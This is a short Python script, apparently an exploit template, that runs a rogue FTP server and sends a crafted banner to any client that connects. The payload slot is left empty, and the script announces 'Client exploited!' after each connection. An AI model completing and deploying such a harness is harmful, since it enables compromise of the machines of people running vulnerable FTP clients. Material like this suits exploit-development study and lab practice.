#!/usr/bin/env python3

import socket

banner = b""  # here will be our payload

# create a socker object
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# bind to any IP address on port 21
s.bind(("0.0.0.0", 21))
# listen for connections
s.listen(1)
print("--> Listening on 21 [FTP]...")

# accept the connection
c, addr = s.accept()
print(f"--> Connection accepted from: {addr[0]}")
# send our banner
c.send(b"200 " + banner + b"\r\n")
# receive data back from the client
c.recv(1024)
# close the connection
c.close()

print("Client exploited! Quitting!")
# close the socket
s.close()
